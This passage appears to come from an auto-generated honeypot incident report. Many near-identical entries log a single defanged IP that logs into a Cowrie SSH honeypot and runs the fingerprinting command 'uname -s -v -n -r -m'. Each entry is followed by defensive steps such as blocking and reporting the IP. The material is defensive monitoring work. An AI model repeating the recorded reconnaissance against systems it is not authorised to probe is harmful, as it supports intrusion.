| `2026-08-08 06:55:36` | `cowrie.client.version` |
| `2026-08-08 06:55:36` | `cowrie.client.kex` |
| `2026-08-08 06:55:36` | `cowrie.login.success` |
| `2026-08-08 06:55:37` | `cowrie.session.params` |
| `2026-08-08 06:55:37` | `cowrie.command.input` |
| `2026-08-08 06:55:37` | `cowrie.log.closed` |
| `2026-08-08 06:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0801e3e393c0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:40` | `cowrie.session.connect` |
| `2026-08-08 06:55:40` | `cowrie.client.version` |
| `2026-08-08 06:55:40` | `cowrie.client.kex` |
| `2026-08-08 06:55:40` | `cowrie.login.success` |
| `2026-08-08 06:55:41` | `cowrie.session.params` |
| `2026-08-08 06:55:41` | `cowrie.command.input` |
| `2026-08-08 06:55:41` | `cowrie.log.closed` |
| `2026-08-08 06:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a64eb77b83f6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:43` | `cowrie.session.connect` |
| `2026-08-08 06:55:43` | `cowrie.client.version` |
| `2026-08-08 06:55:43` | `cowrie.client.kex` |
| `2026-08-08 06:55:44` | `cowrie.login.success` |
| `2026-08-08 06:55:44` | `cowrie.session.params` |
| `2026-08-08 06:55:44` | `cowrie.command.input` |
| `2026-08-08 06:55:45` | `cowrie.log.closed` |
| `2026-08-08 06:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24894243e12c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:47` | `cowrie.session.connect` |
| `2026-08-08 06:55:47` | `cowrie.client.version` |
| `2026-08-08 06:55:47` | `cowrie.client.kex` |
| `2026-08-08 06:55:48` | `cowrie.login.success` |
| `2026-08-08 06:55:48` | `cowrie.session.params` |
| `2026-08-08 06:55:48` | `cowrie.command.input` |
| `2026-08-08 06:55:48` | `cowrie.log.closed` |
| `2026-08-08 06:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b15928936f8

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:51` | `cowrie.session.connect` |
| `2026-08-08 06:55:51` | `cowrie.client.version` |
| `2026-08-08 06:55:51` | `cowrie.client.kex` |
| `2026-08-08 06:55:51` | `cowrie.login.success` |
| `2026-08-08 06:55:52` | `cowrie.session.params` |
| `2026-08-08 06:55:52` | `cowrie.command.input` |
| `2026-08-08 06:55:52` | `cowrie.log.closed` |
| `2026-08-08 06:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6a349a236d4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:55` | `cowrie.session.connect` |
| `2026-08-08 06:55:55` | `cowrie.client.version` |
| `2026-08-08 06:55:55` | `cowrie.client.kex` |
| `2026-08-08 06:55:56` | `cowrie.login.success` |
| `2026-08-08 06:55:57` | `cowrie.session.params` |
| `2026-08-08 06:55:57` | `cowrie.command.input` |
| `2026-08-08 06:55:57` | `cowrie.log.closed` |
| `2026-08-08 06:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48bf04f7aeb5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:59` | `cowrie.session.connect` |
| `2026-08-08 06:55:59` | `cowrie.client.version` |
| `2026-08-08 06:55:59` | `cowrie.client.kex` |
| `2026-08-08 06:55:59` | `cowrie.login.success` |
| `2026-08-08 06:56:00` | `cowrie.session.params` |
| `2026-08-08 06:56:00` | `cowrie.command.input` |
| `2026-08-08 06:56:00` | `cowrie.log.closed` |
| `2026-08-08 06:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4143587b8a5d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:03` | `cowrie.session.connect` |
| `2026-08-08 06:56:03` | `cowrie.client.version` |
| `2026-08-08 06:56:03` | `cowrie.client.kex` |
| `2026-08-08 06:56:03` | `cowrie.login.success` |
| `2026-08-08 06:56:04` | `cowrie.session.params` |
| `2026-08-08 06:56:04` | `cowrie.command.input` |
| `2026-08-08 06:56:04` | `cowrie.log.closed` |
| `2026-08-08 06:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94ead32be88

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:07` | `cowrie.session.connect` |
| `2026-08-08 06:56:07` | `cowrie.client.version` |
| `2026-08-08 06:56:07` | `cowrie.client.kex` |
| `2026-08-08 06:56:07` | `cowrie.login.success` |
| `2026-08-08 06:56:08` | `cowrie.session.params` |
| `2026-08-08 06:56:08` | `cowrie.command.input` |
| `2026-08-08 06:56:09` | `cowrie.log.closed` |
| `2026-08-08 06:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a8e53802f9f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:11` | `cowrie.session.connect` |
| `2026-08-08 06:56:11` | `cowrie.client.version` |
| `2026-08-08 06:56:11` | `cowrie.client.kex` |
| `2026-08-08 06:56:12` | `cowrie.login.success` |
| `2026-08-08 06:56:12` | `cowrie.session.params` |
| `2026-08-08 06:56:12` | `cowrie.command.input` |
| `2026-08-08 06:56:12` | `cowrie.log.closed` |
| `2026-08-08 06:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11aad0aee559

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:15` | `cowrie.session.connect` |
| `2026-08-08 06:56:15` | `cowrie.client.version` |
| `2026-08-08 06:56:15` | `cowrie.client.kex` |
| `2026-08-08 06:56:16` | `cowrie.login.success` |
| `2026-08-08 06:56:16` | `cowrie.session.params` |
| `2026-08-08 06:56:16` | `cowrie.command.input` |
| `2026-08-08 06:56:17` | `cowrie.log.closed` |
| `2026-08-08 06:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1c06d026f0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:19` | `cowrie.session.connect` |
| `2026-08-08 06:56:19` | `cowrie.client.version` |
| `2026-08-08 06:56:19` | `cowrie.client.kex` |
| `2026-08-08 06:56:19` | `cowrie.login.success` |
| `2026-08-08 06:56:20` | `cowrie.session.params` |
| `2026-08-08 06:56:20` | `cowrie.command.input` |
| `2026-08-08 06:56:20` | `cowrie.log.closed` |
| `2026-08-08 06:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7757f3f5b05d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:23` | `cowrie.session.connect` |
| `2026-08-08 06:56:23` | `cowrie.client.version` |
| `2026-08-08 06:56:23` | `cowrie.client.kex` |
| `2026-08-08 06:56:24` | `cowrie.login.success` |
| `2026-08-08 06:56:25` | `cowrie.session.params` |
| `2026-08-08 06:56:25` | `cowrie.command.input` |
| `2026-08-08 06:56:25` | `cowrie.log.closed` |
| `2026-08-08 06:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b177f008d515

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:27` | `cowrie.session.connect` |
| `2026-08-08 06:56:27` | `cowrie.client.version` |
| `2026-08-08 06:56:27` | `cowrie.client.kex` |
| `2026-08-08 06:56:28` | `cowrie.login.success` |
| `2026-08-08 06:56:29` | `cowrie.session.params` |
| `2026-08-08 06:56:29` | `cowrie.command.input` |
| `2026-08-08 06:56:29` | `cowrie.log.closed` |
| `2026-08-08 06:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b464b108fca

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:32` | `cowrie.session.connect` |
| `2026-08-08 06:56:32` | `cowrie.client.version` |
| `2026-08-08 06:56:32` | `cowrie.client.kex` |
| `2026-08-08 06:56:32` | `cowrie.login.success` |
| `2026-08-08 06:56:33` | `cowrie.session.params` |
| `2026-08-08 06:56:33` | `cowrie.command.input` |
| `2026-08-08 06:56:33` | `cowrie.log.closed` |
| `2026-08-08 06:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b501e69636c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:35` | `cowrie.session.connect` |
| `2026-08-08 06:56:36` | `cowrie.client.version` |
| `2026-08-08 06:56:36` | `cowrie.client.kex` |
| `2026-08-08 06:56:36` | `cowrie.login.success` |
| `2026-08-08 06:56:37` | `cowrie.session.params` |
| `2026-08-08 06:56:37` | `cowrie.command.input` |
| `2026-08-08 06:56:37` | `cowrie.log.closed` |
| `2026-08-08 06:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-381c8693ad91

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:40` | `cowrie.session.connect` |
| `2026-08-08 06:56:40` | `cowrie.client.version` |
| `2026-08-08 06:56:40` | `cowrie.client.kex` |
| `2026-08-08 06:56:40` | `cowrie.login.success` |
| `2026-08-08 06:56:41` | `cowrie.session.params` |
| `2026-08-08 06:56:41` | `cowrie.command.input` |
| `2026-08-08 06:56:41` | `cowrie.log.closed` |
| `2026-08-08 06:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95521d077fa

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:44` | `cowrie.session.connect` |
| `2026-08-08 06:56:44` | `cowrie.client.version` |
| `2026-08-08 06:56:44` | `cowrie.client.kex` |
| `2026-08-08 06:56:44` | `cowrie.login.success` |
| `2026-08-08 06:56:45` | `cowrie.session.params` |
| `2026-08-08 06:56:45` | `cowrie.command.input` |
| `2026-08-08 06:56:45` | `cowrie.log.closed` |
| `2026-08-08 06:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-721bec26d87b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:48` | `cowrie.session.connect` |
| `2026-08-08 06:56:48` | `cowrie.client.version` |
| `2026-08-08 06:56:48` | `cowrie.client.kex` |
| `2026-08-08 06:56:48` | `cowrie.login.success` |
| `2026-08-08 06:56:49` | `cowrie.session.params` |
| `2026-08-08 06:56:49` | `cowrie.command.input` |
| `2026-08-08 06:56:49` | `cowrie.log.closed` |
| `2026-08-08 06:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d48d69ebfdfd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:52` | `cowrie.session.connect` |
| `2026-08-08 06:56:52` | `cowrie.client.version` |
| `2026-08-08 06:56:52` | `cowrie.client.kex` |
| `2026-08-08 06:56:52` | `cowrie.login.success` |
| `2026-08-08 06:56:53` | `cowrie.session.params` |
| `2026-08-08 06:56:53` | `cowrie.command.input` |
| `2026-08-08 06:56:53` | `cowrie.log.closed` |
| `2026-08-08 06:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-159ce01304ed

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:56 |
| **Last Seen** | 2026-08-08 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:56:56` | `cowrie.session.connect` |
| `2026-08-08 06:56:56` | `cowrie.client.version` |
| `2026-08-08 06:56:56` | `cowrie.client.kex` |
| `2026-08-08 06:56:56` | `cowrie.login.success` |
| `2026-08-08 06:56:57` | `cowrie.session.params` |
| `2026-08-08 06:56:57` | `cowrie.command.input` |
| `2026-08-08 06:56:57` | `cowrie.log.closed` |
| `2026-08-08 06:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94aa398ece7b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:00` | `cowrie.session.connect` |
| `2026-08-08 06:57:00` | `cowrie.client.version` |
| `2026-08-08 06:57:00` | `cowrie.client.kex` |
| `2026-08-08 06:57:00` | `cowrie.login.success` |
| `2026-08-08 06:57:01` | `cowrie.session.params` |
| `2026-08-08 06:57:01` | `cowrie.command.input` |
| `2026-08-08 06:57:01` | `cowrie.log.closed` |
| `2026-08-08 06:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b472536f62

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:03` | `cowrie.session.connect` |
| `2026-08-08 06:57:04` | `cowrie.client.version` |
| `2026-08-08 06:57:04` | `cowrie.client.kex` |
| `2026-08-08 06:57:04` | `cowrie.login.success` |
| `2026-08-08 06:57:05` | `cowrie.session.params` |
| `2026-08-08 06:57:05` | `cowrie.command.input` |
| `2026-08-08 06:57:05` | `cowrie.log.closed` |
| `2026-08-08 06:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d246c875de06

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:08` | `cowrie.session.connect` |
| `2026-08-08 06:57:08` | `cowrie.client.version` |
| `2026-08-08 06:57:08` | `cowrie.client.kex` |
| `2026-08-08 06:57:08` | `cowrie.login.success` |
| `2026-08-08 06:57:09` | `cowrie.session.params` |
| `2026-08-08 06:57:09` | `cowrie.command.input` |
| `2026-08-08 06:57:09` | `cowrie.log.closed` |
| `2026-08-08 06:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a4a4a913a0a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:12` | `cowrie.session.connect` |
| `2026-08-08 06:57:12` | `cowrie.client.version` |
| `2026-08-08 06:57:12` | `cowrie.client.kex` |
| `2026-08-08 06:57:12` | `cowrie.login.success` |
| `2026-08-08 06:57:13` | `cowrie.session.params` |
| `2026-08-08 06:57:13` | `cowrie.command.input` |
| `2026-08-08 06:57:13` | `cowrie.log.closed` |
| `2026-08-08 06:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2af5946fd15

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:15` | `cowrie.session.connect` |
| `2026-08-08 06:57:15` | `cowrie.client.version` |
| `2026-08-08 06:57:16` | `cowrie.client.kex` |
| `2026-08-08 06:57:16` | `cowrie.login.success` |
| `2026-08-08 06:57:17` | `cowrie.session.params` |
| `2026-08-08 06:57:17` | `cowrie.command.input` |
| `2026-08-08 06:57:17` | `cowrie.log.closed` |
| `2026-08-08 06:57:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ec8dfba8099

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
